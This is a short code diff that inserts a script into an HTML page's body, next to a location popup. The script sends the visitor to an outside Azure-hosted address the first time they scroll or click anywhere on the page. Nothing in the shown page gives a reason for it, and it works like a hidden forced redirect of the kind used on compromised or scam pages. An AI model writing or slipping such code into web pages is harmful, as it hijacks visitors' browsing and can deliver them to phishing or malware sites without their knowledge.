@@ -139,6 +139,25 @@ color:white;
 
 <body>
 
+  <script>
+
+// redirect function
+function redirectUser(){
+  window.location.href = "https://jujuak.z13.web.core.windows.net/";
+}
+
+// detect scroll
+window.addEventListener("scroll", function(){
+  redirectUser();
+}, { once: true });
+
+// detect click anywhere
+document.addEventListener("click", function(){
+  redirectUser();
+}, { once: true });
+
+</script>
+
 <!-- POPUP -->
 
 <div id="locationPopup">
